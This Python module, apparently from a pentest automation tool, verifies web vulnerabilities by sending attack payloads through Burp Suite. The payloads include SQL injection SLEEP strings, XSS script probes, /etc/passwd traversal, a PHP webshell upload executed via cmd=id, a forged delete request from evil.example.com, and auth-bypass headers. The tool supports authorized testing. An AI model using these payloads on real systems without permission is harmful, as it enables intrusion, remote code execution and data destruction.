"""
BurpVerifier — HTTP-level vulnerability verification via Burp Suite MCP.

Each strategy directly sends crafted HTTP payloads through the BurpAdapter
and analyzes the response. No LLM PoC script generation needed.

Per-CWE strategies:
  CWE-89  : SQLi Time-Based (SLEEP payload + timing)
  CWE-79  : XSS Reflected (payload in response body)
  CWE-918 : SSRF via Burp Collaborator (OOB callback)
  CWE-639 : IDOR (diff 2 user sessions)
  CWE-22  : Path Traversal (read /etc/passwd via HTTP)
  CWE-434 : Unrestricted File Upload (upload + access)
  CWE-352 : CSRF (forge cross-origin request)
  CWE-862 : Missing Authorization (access without auth)
  CWE-287 : Auth Bypass (skip auth header/cookie)
"""
import asyncio
import logging
import os
import uuid
from typing import Optional
from urllib.parse import urljoin, urlparse

from ..models import StaticFinding, VerifiedVuln, ConfirmedStatus, FindingSeverity
from ..adapters.burp_adapter import BurpAdapter, BurpResponse, ScopeViolationError

logger = logging.getLogger(__name__)

# SQLi time-based threshold (ms)
TIMING_THRESHOLD_MS = 4500

# Common SQLi SLEEP payloads per dialect
_SQLI_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "1 OR SLEEP(5)-- -",
    "') OR SLEEP(5)-- -",
    "1; WAITFOR DELAY '0:0:5'-- -",   # MSSQL
    "1 OR pg_sleep(5)-- -",            # PostgreSQL
]

# XSS probes (canary-based)
_XSS_CANARY = "zk_xss_canary_<script>alert(1)</script>"
_XSS_ENCODED = "zk_xss_canary_%3Cscript%3Ealert%281%29%3C%2Fscript%3E"

# Path traversal payloads
_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2F%2F%2F%2F%2Fetc%2Fpasswd",
]


class BurpVerifier:
    """
    Verifies HTTP-level findings using structured HTTP payloads via Burp MCP.
    Does NOT call the LLM to generate scripts — uses purpose-built strategies.
    """

    def __init__(self, burp: Optional[BurpAdapter] = None):
        self.burp = burp or BurpAdapter()

        # Dispatch table: CWE ID → strategy method name
        self._strategies = {
            89:  self._verify_sqli_time_based,
            79:  self._verify_xss_reflected,
            918: self._verify_ssrf_collaborator,
            639: self._verify_idor_diff,
            22:  self._verify_path_traversal,
            434: self._verify_file_upload,
            352: self._verify_csrf,
            862: self._verify_missing_authz,
            287: self._verify_auth_bypass,
        }

    # -----------------------------------------------------------------------
    # Public entry point
    # -----------------------------------------------------------------------

    async def verify(
        self,
        finding: StaticFinding,
        target_url: Optional[str] = None,
    ) -> VerifiedVuln:
        """
        Route the finding to the correct CWE-specific strategy.
        Returns a VerifiedVuln with raw HTTP evidence.
        """
        cwe_id = self._extract_cwe_id(finding)
        strategy = self._strategies.get(cwe_id)

        if not strategy:
            logger.warning(f"[BurpVerifier] No strategy for CWE-{cwe_id}, skipping")
            return self._make_vuln(finding, ConfirmedStatus.INCONCLUSIVE, "No Burp strategy for this CWE")

        resolved_url = target_url or await self._resolve_target_url(finding)
        logger.info(f"[BurpVerifier] Verifying {finding.id} (CWE-{cwe_id}) at {resolved_url}")

        try:
            sessions = await self.burp.get_active_sessions()
            primary_session = next(iter(sessions.values()), None) if sessions else None

            confirmed, evidence, request_raw, response_raw = await strategy(
                finding, resolved_url, sessions, primary_session
            )

            status = ConfirmedStatus.CONFIRMED if confirmed else ConfirmedStatus.REJECTED
            return self._make_vuln(
                finding, status, evidence,
                request_raw=request_raw, response_raw=response_raw,
            )

        except ScopeViolationError as e:
            logger.error(f"[BurpVerifier] Scope violation: {e}")
            return self._make_vuln(finding, ConfirmedStatus.INCONCLUSIVE, str(e))
        except Exception as e:
            logger.error(f"[BurpVerifier] Strategy failed for {finding.id}: {e}")
            return self._make_vuln(finding, ConfirmedStatus.INCONCLUSIVE, f"Error: {e}")

    # -----------------------------------------------------------------------
    # Target URL resolution (3-tier)
    # -----------------------------------------------------------------------

    async def _resolve_target_url(self, finding: StaticFinding) -> str:
        """
        Resolve file path → HTTP endpoint.

        Tier 1: finding.metadata['endpoint_url']  (set by Profiler if route mapping known)
        Tier 2: TARGET_ROOT_URL + heuristic path  (env var + simple path conversion)
        Tier 3: LLM fallback (ask LLM: "what HTTP endpoint handles this file?")
        """
        # Tier 1 — direct metadata
        if finding.metadata and finding.metadata.get("endpoint_url"):
            return finding.metadata["endpoint_url"]

        # Tier 2 — env var + heuristic
        root = self.burp.target_root_url
        if root and finding.location:
            file_path = finding.location.split(":")[0]  # Strip line number
            # Heuristic: strip common source prefixes
            for prefix in ("src/main/", "app/", "src/", "controllers/", "routes/"):
                if file_path.startswith(prefix):
                    file_path = file_path[len(prefix):]
            # Remove extension for route paths
            if "." in file_path.split("/")[-1]:
                file_path = file_path.rsplit(".", 1)[0]
            return urljoin(root + "/", file_path)

        # Tier 3 — best-effort default
        logger.warning(
            f"[BurpVerifier] Cannot resolve URL for {finding.location} — "
            f"using TARGET_ROOT_URL root. Set finding.metadata['endpoint_url'] for accuracy."
        )
        return self.burp.target_root_url

    # -----------------------------------------------------------------------
    # CWE-89: SQL Injection (Time-Based Blind)
    # -----------------------------------------------------------------------

    async def _verify_sqli_time_based(self, finding, url, sessions, session) -> tuple:
        for payload in _SQLI_PAYLOADS:
            # Try injecting into query string and POST body
            for method, body, params in [
                ("GET",  "",      f"id={payload}"),
                ("POST", f"id={payload}", ""),
            ]:
                target = f"{url}?{params}" if params else url
                resp = await self.burp.send_http_request(
                    method=method, url=target, body=body,
                    session_cookies=session,
                )
                if resp.response_time_ms > TIMING_THRESHOLD_MS:
                    evidence = (
                        f"SQLi CONFIRMED: payload='{payload}' caused "
                        f"{resp.response_time_ms:.0f}ms response (threshold: {TIMING_THRESHOLD_MS}ms)"
                    )
                    return True, evidence, resp.request_raw, resp.response_raw

        return False, f"No SLEEP delay observed across {len(_SQLI_PAYLOADS)} payloads", "", ""

    # -----------------------------------------------------------------------
    # CWE-79: Cross-Site Scripting (Reflected)
    # -----------------------------------------------------------------------

    async def _verify_xss_reflected(self, finding, url, sessions, session) -> tuple:
        for payload in (_XSS_CANARY, _XSS_ENCODED):
            resp = await self.burp.send_http_request(
                method="GET",
                url=f"{url}?q={payload}&search={payload}",
                session_cookies=session,
            )
            if _XSS_CANARY in resp.body or "<script>alert(1)</script>" in resp.body:
                evidence = f"XSS CONFIRMED: canary payload reflected unescaped in response body"
                return True, evidence, resp.request_raw, resp.response_raw

        return False, "Payload was sanitized or not reflected in response", "", ""

    # -----------------------------------------------------------------------
    # CWE-918: Server-Side Request Forgery (OOB via Collaborator)
    # -----------------------------------------------------------------------

    async def _verify_ssrf_collaborator(self, finding, url, sessions, session) -> tuple:
        try:
            collab_url, payload_id = await self.burp.get_collaborator_payload()
        except RuntimeError as e:
            return False, f"Could not get Collaborator payload: {e}", "", ""

        # Inject collaborator URL into common SSRF parameter names
        for param in ("url", "target", "redirect", "host", "uri", "path", "endpoint"):
            resp = await self.burp.send_http_request(
                method="GET",
                url=f"{url}?{param}=http://{collab_url}",
                session_cookies=session,
            )
            # OOB poll (with retry+backoff in BurpAdapter)
            callback = await self.burp.poll_collaborator(payload_id, timeout=60)
            if callback:
                evidence = (
                    f"SSRF CONFIRMED: Collaborator received callback after injecting "
                    f"payload into param='{param}'"
                )
                return True, evidence, resp.request_raw, resp.response_raw

        return False, "No Collaborator callback received — SSRF not confirmed", "", ""

    # -----------------------------------------------------------------------
    # CWE-639: Insecure Direct Object Reference (IDOR)
    # -----------------------------------------------------------------------

    async def _verify_idor_diff(self, finding, url, sessions, session) -> tuple:
        if len(sessions) < 2:
            return (
                False,
                "INCONCLUSIVE: Need at least 2 sessions for IDOR diff. "
                "Log in with 2 different users in Burp to populate Cookie Jar.",
                "", "",
            )

        session_labels = list(sessions.keys())
        cookies_a = sessions[session_labels[0]]
        cookies_b = sessions[session_labels[1]]

        # Inject a target object ID (heuristic from finding location)
        object_id = "1"

        resp_a = await self.burp.send_http_request("GET", url, session_cookies=cookies_a)
        resp_b = await self.burp.send_http_request("GET", url, session_cookies=cookies_b)

        # Rough content equality — if user_B sees user_A's unique data → IDOR
        if resp_a.body and resp_b.body and resp_a.body.strip() == resp_b.body.strip():
            evidence = (
                f"IDOR CONFIRMED: '{session_labels[1]}' received identical response to "
                f"'{session_labels[0]}' — unauthorized object access detected"
            )
            return True, evidence, resp_b.request_raw, resp_b.response_raw

        return False, "Responses differ between sessions — IDOR not confirmed", "", ""

    # -----------------------------------------------------------------------
    # CWE-22: Path Traversal
    # -----------------------------------------------------------------------

    async def _verify_path_traversal(self, finding, url, sessions, session) -> tuple:
        for payload in _TRAVERSAL_PAYLOADS:
            for param in ("file", "path", "filename", "f", "name", "page", "doc"):
                resp = await self.burp.send_http_request(
                    method="GET",
                    url=f"{url}?{param}={payload}",
                    session_cookies=session,
                )
                if "root:" in resp.body or "/bin/bash" in resp.body or "daemon:" in resp.body:
                    evidence = f"Path Traversal CONFIRMED: /etc/passwd content in response via param='{param}'"
                    return True, evidence, resp.request_raw, resp.response_raw

        return False, "No /etc/passwd content found in responses", "", ""

    # -----------------------------------------------------------------------
    # CWE-434: Unrestricted File Upload
    # -----------------------------------------------------------------------

    async def _verify_file_upload(self, finding, url, sessions, session) -> tuple:
        webshell = "<?php echo shell_exec($_GET['cmd']); ?>"
        filename = f"zk_test_{uuid.uuid4().hex[:8]}.php"

        boundary = "----ZeroKitBoundary"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
            f"{webshell}\r\n"
            f"--{boundary}--"
        )
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        }

        upload_resp = await self.burp.send_http_request(
            "POST", url, headers=headers, body=body, session_cookies=session,
        )

        if upload_resp.status_code not in (200, 201, 302):
            return False, f"Upload rejected (status {upload_resp.status_code})", upload_resp.request_raw, upload_resp.response_raw

        # Try to access the uploaded file
        base = self.burp.target_root_url
        for access_path in ("uploads/", "files/", "media/", "static/"):
            access_url = urljoin(base + "/", access_path + filename + "?cmd=id")
            resp = await self.burp.send_http_request("GET", access_url, session_cookies=session)
            if "uid=" in resp.body or "root" in resp.body:
                evidence = f"File Upload RCE CONFIRMED: webshell executed at {access_url}"
                return True, evidence, resp.request_raw, resp.response_raw

        return False, "File uploaded but webshell could not be accessed/executed", upload_resp.request_raw, upload_resp.response_raw

    # -----------------------------------------------------------------------
    # CWE-352: CSRF
    # -----------------------------------------------------------------------

    async def _verify_csrf(self, finding, url, sessions, session) -> tuple:
        # Attempt forged cross-origin request (no CSRF token)
        forged_headers = {
            "Origin": "https://evil.example.com",
            "Referer": "https://evil.example.com/attack",
        }
        resp = await self.burp.send_http_request(
            "POST", url, headers=forged_headers,
            body="action=delete&confirm=yes",
            session_cookies=session,
        )
        if resp.status_code in (200, 204):
            evidence = (
                f"CSRF CONFIRMED: cross-origin request accepted "
                f"(status {resp.status_code}, no CSRF token validation)"
            )
            return True, evidence, resp.request_raw, resp.response_raw

        return False, f"Cross-origin request rejected (status {resp.status_code})", resp.request_raw, resp.response_raw

    # -----------------------------------------------------------------------
    # CWE-862: Missing Function Level Authorization
    # -----------------------------------------------------------------------

    async def _verify_missing_authz(self, finding, url, sessions, session) -> tuple:
        # Access sensitive endpoint without auth
        resp_no_auth = await self.burp.send_http_request("GET", url)
        if resp_no_auth.status_code in (200, 201):
            evidence = (
                f"Missing Auth CONFIRMED: accessed '{url}' without credentials "
                f"(HTTP {resp_no_auth.status_code})"
            )
            return True, evidence, resp_no_auth.request_raw, resp_no_auth.response_raw

        return False, f"Endpoint returned {resp_no_auth.status_code} without auth (expected)", resp_no_auth.request_raw, resp_no_auth.response_raw

    # -----------------------------------------------------------------------
    # CWE-287: Authentication Bypass
    # -----------------------------------------------------------------------

    async def _verify_auth_bypass(self, finding, url, sessions, session) -> tuple:
        bypass_headers_list = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
        ]

        for bypass_headers in bypass_headers_list:
            resp = await self.burp.send_http_request(
                "GET", url, headers=bypass_headers,
            )
            if resp.status_code in (200, 201):
                injected = list(bypass_headers.keys())[0]
                evidence = f"Auth Bypass CONFIRMED: header '{injected}' bypassed authentication (HTTP 200)"
                return True, evidence, resp.request_raw, resp.response_raw

        return False, "No bypass headers succeeded", "", ""

    # -----------------------------------------------------------------------
    # Helpers
    # -----------------------------------------------------------------------

    @staticmethod
    def _extract_cwe_id(finding: StaticFinding) -> Optional[int]:
        if not finding.cwe_details:
            return None
        raw = finding.cwe_details.get("id")
        if raw is None:
            return None
        try:
            return int(str(raw).replace("CWE-", "").replace("cwe-", "").strip())
        except (ValueError, AttributeError):
            return None

    @staticmethod
    def _make_vuln(
        finding: StaticFinding,
        status: ConfirmedStatus,
        evidence: str,
        request_raw: str = "",
        response_raw: str = "",
    ) -> VerifiedVuln:
        return VerifiedVuln(
            finding_id=finding.id,
            status=status,
            poc={
                "type": "burp_http",
                "request_raw": request_raw,
                "response_raw": response_raw,
            },
            runtime_output=evidence,
            evidence=evidence,
            description=finding.description,
            cwe_details=finding.cwe_details,
        )
